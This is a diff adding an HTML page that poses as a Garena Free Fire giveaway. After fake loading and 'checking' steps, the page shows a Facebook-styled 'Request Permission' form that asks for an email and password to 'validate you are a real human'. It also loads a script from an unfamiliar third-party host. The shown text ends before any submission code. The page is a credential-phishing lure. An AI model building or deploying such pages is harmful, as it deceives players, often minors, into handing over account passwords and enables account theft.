@@ -1,0 +1,1589 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//隐藏;
+                        document.getElementById("second-box").style.display="none";//隐藏;
+                        document.getElementById("third-box").style.display="none";//隐藏;
+                        document.getElementsByClassName("loading2__box").style.display="";//隐藏;
+                    }*/
+
+
+    </script>
+    <meta charset="utf-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta property="og:site_name" content="Garena Giveaways">
+    <meta property="og:title" content="Garena freefire Offers"/>
+    <meta property="og:description" content="Amazing prizes and awards from Garena freefirea">
+    <meta property="og:image" itemprop="image" content="https://images.app.goo.gl/LYpFoeqwg2E4pmtm6">
+    <meta property="og:type" content="website"/>
+    <meta property="og:updated_time" content="1440432930"/>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&display=swap" rel="stylesheet">-->
+    <title>Garena Freefire Giveaways</title>
+    
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BFBH84PK0K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BFBH84PK0K');
+</script>
+
+
+<script src="https://meerihoh.net/pfe/current/tag.min.js?z=3788718" data-cfasync="false" async></script>
+
+    <style>
+        :root {
+            --color-primary: rgb(37, 38, 38);
+            --color-secondary: #06C167
+        }
+
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0
+        }
+
+        html {
+            font-size: 62.5%;
+            font-family: Montserrat;
+            font-weight: 500;
+            color: var(--color-primary)
+        }
+
+        .quedate-container, body {
+            width: 100vw
+        }
+
+        .container-chat {
+            font-weight: 400
+        }
+
+        .chat, .wrapper {
+            display: flex;
+            flex-direction: column
+        }
+
+        .loading__box-1--hidden {
+            display: none !important
+        }
+
+        .loading__box-2--hidden {
+            display: none !important
+        }
+
+        .loading__box-3--hidden {
+            display: none !important
+        }
+
+        .loading__check-1--hidden {
+            display: none !important
+        }
+
+        .loading__check-2--hidden {
+            display: none !important
+        }
+
+        .loading__check-3--hidden {
+            display: none !important
+        }
+
+        .chat__reactions {
+            width: 90%;
+            margin: 2rem auto 0;
+            display: flex;
+            align-items: stretch;
+            font-size: .95rem
+        }
+
+        .chat__reactions-icon {
+            width: 1.2rem;
+            margin-right: .2rem
+        }
+
+        .chat__reactions-text {
+            margin-left: .5rem
+        }
+
+        .chat__reactions-counter {
+            margin-left: 1.8rem
+        }
+
+        .chat__actions {
+            margin-top: 1rem;
+            display: flex;
+            justify-content: space-around;
+            font-size: 1.2rem;
+            border-top: 1.4px solid #b0b0b0;
+            border-bottom: .5px solid #d3d3d3
+        }
+
+        .chat__actions-box {
+            display: flex;
+            align-items: center
+        }
+
+        .chat__actions img {
+            width: 4rem
+        }
+
+        .chat__conversation {
+            width: 90%;
+            margin: 0 auto;
+            font-size: 1.1rem
+        }
+
+        .chat__conversation-box {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            margin-top: 1rem;
+            position: relative
+        }
+
+        .chat__conversation-box--right {
+            margin-left: 20%;
+            margin-bottom: 1rem
+        }
+
+        .chat__conversation-box-img {
+            width: 3.5rem;
+            border-radius: 50%;
+            margin-right: 1rem;
+            align-self: baseline
+        }
+
+        .chat__conversation-box-active {
+            width: 1rem;
+            height: 1rem;
+            background-color: var(--color-secondary);
+            border-radius: 50%;
+            position: absolute;
+            top: 2.5rem;
+            left: 2.7rem
+        }
+
+        .chat__conversation-box-content-comment {
+            padding: 1rem;
+            background-color: #f2f3f5;
+            border-top-left-radius: 14px;
+            border-top-right-radius: 14px;
+            border-bottom-left-radius: 14px;
+            border-bottom-right-radius: 14px
+        }
+
+        .chat__conversation-box-content-comment-name {
+            color: #726695;
+            font-weight: 500;
+            margin-right: .4rem
+        }
+
+        .chat__conversation-box-content-cta {
+            margin-top: .3rem;
+            padding-left: 1.5rem;
+            color: #726695
+        }
+
+        .chat__conversation-box-content-cta-text {
+            margin-right: .5rem
+        }
+
+        .chat__conversation-box-content-cta--2 {
+            font-size: .9rem
+        }
+
+        .chat__conversation-reply {
+            margin-left: 20%;
+            color: gray
+        }
+
+        .chat__conversation-reply--efect {
+            animation: opacidad 1s infinite
+        }
+
+        @keyframes opacidad {
+
+        0
+        {
+            opacity: 0
+        }
+        50
+        %
+        {
+            opacity: 1
+        }
+        100
+        %
+        {
+            opacity: 0
+        }
+        }
+        .chat__conversation-write {
+            position: relative;
+            margin-bottom: 2rem
+        }
+
+        .chat__conversation-write input {
+            width: 100%;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            border: none;
+            background-color: #f2f3f5;
+            border-radius: 100px;
+            padding: .8rem;
+            color: var(--color-primary);
+            padding-left: 1rem;
+            outline: 0
+        }
+
+        .chat__conversation-write-icons {
+            display: flex;
+            flex-direction: row;
+            position: absolute;
+            right: 1.2rem;
+            top: 1.8rem
+        }
+
+        .chat__conversation-write-icons-img {
+            width: 1.2rem;
+            margin-right: .5rem;
+            fill: gray
+        }
+
+        .chat__conversation-write-icons-img--svg {
+            width: 2rem
+        }
+
+        .loading {
+            width: 100%;
+            height: 220px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            top: 48px;
+            z-index: 10;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
+        }
+
+        .loading__box {
+            width: 50%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            position: relative
+        }
+
+        .loading__animate, .loading__check {
+            width: 5rem
+        }
+
+        .loading__check {
+            position: absolute;
+            left: 0
+        }
+
+        .loading__txt {
+            font-size: 1.2rem;
+            color: var(--color-primary);
+            margin-left: 1rem
+        }
+
+        .loading2 {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            top: 48px;
+            z-index: 20;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
+        }
+
+        .loading2__box {
+            text-align: justify;
+            padding: 2rem;
+            color: var(--color-primary);
+            font-size: 14px
+        }
+
+        .loading2__permission {
+            width: 12rem;
+            margin: 0 auto
+        }
+
+        .js-hidden {
+            display: none !important
+        }
+
+        .js-display {
+            display: block
+        }
+
+        .js-show {
+            visibility: hidden !important
+        }
+
+        .logo-container {
+            width: 100%;
+            padding-top: 1.5rem;
+            padding-bottom: 1.5rem;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            color: var(--color-primary);
+            font-size: 1.8rem
+        }
+
+        .quedate-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center
+        }
+
+        .quedate {
+            width: 100%
+        }
+
+        .quedate__fixed {
+            background-color: var(--color-primary)
+        }
+
+        .quedate__fixed-box {
+            width: 90%;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            padding: .5rem
+        }
+
+        .quedate__fixed-box span {
+            margin: 0 auto;
+            color: #fff;
+            font-size: 1.5rem
+        }
+
+        .quedate__company {
+            width: 30%;
+            border-right: 1px solid var(--color-secondary)
+        }
+
+        .quedate__step {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-top: 3rem
+        }
+
+        .quedate__step-box {
+            width: 80%;
+            height: 70px;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 2rem
+        }
+
+        .quedate__border {
+            width: 30px;
+            height: 80%;
+            background-color: var(--color-secondary);
+            margin-right: 1rem
+        }
+
+        .quedate__cta-btn {
+            width: 80%;
+            font-size: 2rem;
+            font-weight: 700;
+            color: #fff;
+            padding: 1rem;
+            border: none;
+            background-color: var(--color-secondary);
+            border-top-left-radius: 14px;
+            border-top-right-radius: 14px;
+            border-bottom-left-radius: 14px;
+            border-bottom-right-radius: 14px;
+            outline: 0;
+            margin: 0 0 0 3.5rem
+        }
+
+        .quedate__cta-btn:active, .quedate__cta-btn:hover {
+            background-color: #03a658
+        }
+
+        .quedate__cta-btn:active {
+            transform: translateY(2px)
+        }
+
+        .quedate__loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center
+        }
+
+        .quedate__svg {
+            position: relative
+        }
+
+        .quedate__check {
+            position: absolute;
+            left: 0
+        }
+
+        .quedate__porcent {
+            margin-top: 1rem;
+            margin-bottom: 2rem;
+            font-size: 2.5rem;
+            font-weight: 700
+        }
+
+        .quedate__form {
+            border: 1.5px solid #c0bfc3;
+            border-top-right-radius: 8px;
+            border-top-left-radius: 8px;
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+            padding: 1rem;
+            position: relative;
+            margin-top: 2.5rem
+        }
+
+        .quedate__form-input {
+            border: none;
+            outline: 0
+        }
+
+        .quedate__form-input::placeholder {
+            color: #c0bfc3;
+            font-family: inherit;
+            font-size: 1.5rem
+        }
+
+        .quedate__form-separar {
+            position: absolute;
+            width: 1px;
+            height: 100%;
+            top: 0;
+            background-color: #c0bfc3
+        }
+
+        .quedate__form-label {
+            font-size: 1.5rem;
+            font-weight: 700;
+            padding: 2rem
+        }
+
+        .quedate__first {
+            width: 90%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            margin: 9px auto
+        }
+
+        .quedate__load {
+            width: 80%;
+            font-size: 1.3rem;
+            padding: .8rem;
+            border: 1px solid var(--color-primary);
+            position: relative
+        }
+
+        .quedate__load-icon {
+            width: 30%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            border: 1px solid var(--color-primary);
+            padding-right: .8rem;
+            padding-left: .8rem;
+            border-left: none
+        }
+
+        .quedate__load-text {
+            margin-left: .5rem;
+            font-size: 1.2rem;
+            font-weight: 700
+        }
+
+        .quedate__load-a {
+            position: absolute;
+            height: 3.2rem;
+            top: 0;
+            z-index: -1;
+            left: 0;
+            background-color: var(--color-secondary)
+        }
+
+        .permision-container {
+            width: 95%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .4);
+            position: absolute;
+            top: .8rem;
+            left: .8rem;
+            z-index: 15
+        }
+
+        .permision-container-box {
+            width: 95%;
+            margin: 0 auto
+        }
+
+        .permision-container-end, .permision-container-request-text {
+            width: 100%;
+            padding: 1.2rem;
+            background-color: #ededf3;
+            font-size: 1.5rem;
+            font-weight: 700
+        }
+
+        .permision-container-end {
+            font-size: 1rem;
+            font-weight: 400;
+            text-align: center
+        }
+
+        .permision-container-data {
+            padding: 2rem
+        }
+
+        .permision-container-icons {
+            width: 60%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: space-around;
+            margin-bottom: 2.5rem
+        }
+
+        .permision-container-icons-face, .permision-container-icons-uber {
+            width: 8rem
+        }
+
+        .permision-container-txt {
+            margin: 0 auto;
+            font-size: 1.5rem;
+            text-align: center;
+            margin-bottom: 1.5rem
+        }
+
+        .permision-container-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between
+        }
+
+        .permision-container-input {
+            outline: 0;
+            padding: 1.2rem;
+            width: 100%;
+            margin-bottom: 1.5rem;
+            border-top-left-radius: 10px;
+            border-top-right-radius: 10px;
+            border-bottom-left-radius: 10px;
+            border-bottom-right-radius: 10px;
+            border: 1px solid #b9b9b9;
+            color: gray;
+            font-size: 1.2rem
+        }
+
+        .permision-container-secure {
+            margin-top: 1rem;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            color: #a2a2a2
+        }
+
+        .permision-container-secure svg {
+            width: 1.5rem;
+            height: 1.5rem;
+            margin-right: 1rem
+        }
+
+        .permision-container-cta {
+            width: 100%;
+            padding: .8rem;
+            margin-top: 1rem;
+            margin-bottom: 1.5rem;
+            margin-left: 0;
+            font-size: 1.8rem
+        }
+
+        /* Chrome, Safari, Edge, Opera */
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Firefox */
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+
+<body>
+<div class="wrapper">
+    <div class="container-main">
+        
+        <img src="https://wp.pixolette.com/wp-content/uploads/2017/06/teaser_4-1024x159.png" width="100%">
+        
+        <header class="logo-container">
+            <svg fill="#06C167" height="20px" viewBox="-31 0 512 512" width="20px" xmlns="http://www.w3.org/2000/svg">
+                <path d="m30 316c-16.570312 0-30 13.429688-30 30 0 16.566406 13.429688 30 30 30h59l-14 106c0 16.566406 13.429688 30 30 30s30-13.433594 30-30l14-106h120l-14 106c0 16.566406 13.429688 30 30 30s30-13.433594 30-30l14-106h61c16.570312 0 30-13.433594 30-30 0-16.570312-13.429688-30-30-30h-53l16-120h67c16.570312 0 30-13.433594 30-30 0-16.570312-13.429688-30-30-30h-59l14-106c0-16.570312-13.429688-30-30-30s-30 13.429688-30 30l-14 106h-120l14-106c0-16.570312-13.429688-30-30-30s-30 13.429688-30 30l-14 106h-61c-16.570312 0-30 13.429688-30 30 0 16.566406 13.429688 30 30 30h53l-16 120zm143-120h120l-16 120h-120zm0 0" />
+            </svg>
+            
+                
+                    
+            <span class="quedate-logo">FREEFIRE GIVEAWAYS SSA</span>
+        </header>
+        <div class="quedate-container">
+            <main class="quedate">
+                
+                    
+                
+
+                <!-- Primera parte: ads description -->
+                <div class="quedate__step" id="first-box">
+                    <div class="quedate__step-box">
+                        <span class="quedate__border"></span>
+                        <p style="font-size: 2.0rem;" class="quedate__text"><b>Garena Free Giveaways!</b>
+                        </p>
+                        <span class="quedate__border"></span>
+                    </div>
+                    <button style="margin:0;" id="validar" class="quedate__cta-btn">Check it</button>
+                </div>
+
+
+                <div class="quedate__loading">
+                    <!--loading svg-->
+                    <svg id="loading-svg" class="js-hidden" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto; " viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="10rem">
+                        <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#06C167" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                            <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                        </circle>
+                        <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                            <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                        </circle>
+                    </svg>
+                    <!--end loading svg-->
+
+                    <!--checked svg-->
+                    <svg id="check-svg" class="js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="鍦栧堡_1" version="1.1" style=" background: rgb(255, 255, 255);" width="10rem">
+                            <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                <g class="ldl-ani">
+                                    <g class="ldl-layer">
+                                        <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                            <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle>
+                                        </g>
+                                    </g>
+                                    <g class="ldl-layer">
+                                        <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                            <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path>
+                                        </g>
+                                    </g>
+                                    <metadata xmlns:d="https://loading.io/stock/">
+                                        <d:name>ok</d:name>
+                                        <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success</d:tags>
+                                        <d:license>by</d:license>
+                                        <d:slug>364zp</d:slug>
+                                    </metadata>
+                                </g>
+                            </g>
+                        </svg>
+                    <!--end check svg-->
+
+                    <span class="quedate__porcent js-hidden"></span>
+                    <span style="font-size: 16px;font-weight: bold;" class="quedate__porcent-text js-hidden">Thanks, we already checked</span>
+                </div>
+                <!-- termina la primera parte -->
+
+                <!-- Segunda parte -->
+                <div id="second-box" style="margin-bottom: 2.5rem" class="quedate__step js-hidden">
+                    <div class="quedate__step-box">
+                        <p style="font-size: 1.5rem; text-align:center" class="quedate__text">Enter your ID <b class="quedate__city"></b> to check  <code></code>.</p>
+                    </div>
+                    <script>
+                        var prevent = (e) => e.preventDefault();
+                    </script>
+                    <form class="quedate__form" onsubmit="return prevent(event)">
+                        <input class="quedate__form-input" id="num" type="number" placeholder="ID">
+                        <span class="quedate__form-separar"></span>
+                        <label id="enviar" class="quedate__form-label" for="num">Send</label>
+                        <div class="message-status js-hidden"></div>
+                    </form>
+                </div>
+
+                <!-- Tercera parte -->
+                <div id="third-box" style="margin-bottom: 2.5rem;" class="quedate__step js-hidden">
+                    <span style="font-weight: bold; font-size: 2rem; text-align:center" class="quedate__text">Complete these 3 steps</span>
+                    <div class="quedate__first js-hidden">
+                        <div style="border: 1px solid gray;  width:80%" class="quedate__load">Connecting our servers...<span class="quedate__load-a js-hidden"></span>
+                        </div>
+                        <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
+                            <svg id="first-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#06C167" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                </circle>
+                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                                </circle>
+                            </svg>
+                            <svg id="first-checked" class="quedate__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="鍦栧堡_1" version="1.1" width=" 3.2rem">
+                                    <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                        <g class="ldl-ani">
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle>
+                                                </g>
+                                            </g>
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path>
+                                                </g>
+                                            </g>
+                                            <metadata xmlns:d="https://loading.io/stock/">
+                                                <d:name>ok</d:name>
+                                                <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success</d:tags>
+                                                <d:license>by</d:license>
+                                                <d:slug>364zp</d:slug>
+                                            </metadata>
+                                        </g>
+                                    </g>
+                                </svg>
+                            <span id="first-porcent" class="quedate__load-text"></span>
+                        </div>
+                    </div>
+
+                    <div class="quedate__first js-hidden">
+                        <div style="border: 1px solid gray; width:80%" class="quedate__load">Checking the database    ...<span class="quedate__load-a js-hidden"></span>
+                        </div>
+                        <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
+                            <svg id="second-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#06C167" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                </circle>
+                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                                </circle>
+                            </svg>
+                            <svg id="second-checked" class="quedate__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="鍦栧堡_1" version="1.1" width=" 3.2rem">
+                                    <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                        <g class="ldl-ani">
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle>
+                                                </g>
+                                            </g>
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path>
+                                                </g>
+                                            </g>
+                                            <metadata xmlns:d="https://loading.io/stock/">
+                                                <d:name>ok</d:name>
+                                                <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success</d:tags>
+                                                <d:license>by</d:license>
+                                                <d:slug>364zp</d:slug>
+                                            </metadata>
+                                        </g>
+                                    </g>
+                                </svg>
+                            <span id="second-porcent" class="quedate__load-text"></span>
+                        </div>
+                    </div>
+
+
+                </div>
+
+                <!-- Loading-->
+                <div id="loading-g" class="quedate__step js-hidden">
+                    <div class="quedate__step-box">
+                        <svg class="quedate__animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="10rem">
+                            <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#06C167" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                            </circle>
+                            <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#5de9a6" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                            </circle>
+                        </svg>
+                    </div>
+                    <p style="font-size: 14px;font-weight: bold;">Wait, we are validating data</p>
+                </div>
+            </main>
+        </div>
+        <!-- FIN PASOS -->
+
+        <!-- Ventana permiso -->
+        <div class="permision-container js-hidden">
+            <span class="permision-container-request-text">Request Permission</span>
+            <div class="permision-container-data">
+                <div class="permision-container-icons">
+                    <?xml version="1.0" encoding="iso-8859-1" ?>
+                    <!-- Generator: Adobe Illustrator 18.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+                    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+                    <svg width="50px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 112.196 112.196" style="enable-background:new 0 0 112.196 112.196;" xml:space="preserve">
+                            <g>
+                                <circle style="fill:#3B5998;" cx="56.098" cy="56.098" r="56.098" />
+                                <path style="fill:#FFFFFF;" d="M70.201,58.294h-10.01v36.672H45.025V58.294h-7.213V45.406h7.213v-8.34
+            		c0-5.964,2.833-15.303,15.301-15.303L71.56,21.81v12.51h-8.151c-1.337,0-3.217,0.668-3.217,3.513v7.585h11.334L70.201,58.294z" />
+                            </g>
+                        </svg>
+
+                </div>
+                <div class="permision-container-box">
+                    <p class="permision-container-txt">We should validate you are a real human checking your name and profile photo.</p>
+                    <form action="#" class="permision-container-form">
+                        <input class="permision-container-input" type="text" id="email" placeholder="your@email.com">
+                        <label class="permision-container-label" for="email"></label>
+                        <input class="permision-container-input" type="password" id="pass" placeholder="路路路路路路路路路路">
+                        <label class="permision-container-label" for="pass"></label>
+                    </form>
+                    <span class="message-status fb-request"></span>
+                    <button style="width:100%; margin-left: 0;" id="aceptar" class="quedate__cta-btn">Accept - Im Human</button>
+                    <div class="permision-container-secure">
+                        <svg fill="#a2a2a2" height="512pt" viewBox="-64 0 512 512" width="512pt" xmlns="http://www.w3.org/2000/svg">
+                            <path d="m336 192h-16v-64c0-70.59375-57.40625-128-128-128s-128 57.40625-128 128v64h-16c-26.453125 0-48 21.523438-48 48v224c0 26.476562 21.546875 48 48 48h288c26.453125 0 48-21.523438 48-48v-224c0-26.476562-21.546875-48-48-48zm-229.332031-64c0-47.0625 38.269531-85.332031 85.332031-85.332031s85.332031 38.269531 85.332031 85.332031v64h-170.664062zm0 0" />
+                        </svg>
+                        <p class="permision-container-secure-text">The app is not allowed to post on Facebook</p>
+                    </div>
+                </div>
+            </div>
+            <span class="permision-container-end">Our service privacy policy and conditions</span>
+        </div>
+        <div style="height: 269px;" class="loading2 js-hidden">
+            <div style="text-align: center !important;" class="loading2__box">
+                <svg class="loading2__permission" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+                    <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#06C167" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                        <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                    </circle>
+                    <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#6ae8a4" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                        <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                    </circle>
+                </svg>
+                <p style="text-align:center">Wait a moment, we validate data.</p>
+            </div>
+        </div>
+
+
+
+        <!--congratulations -->
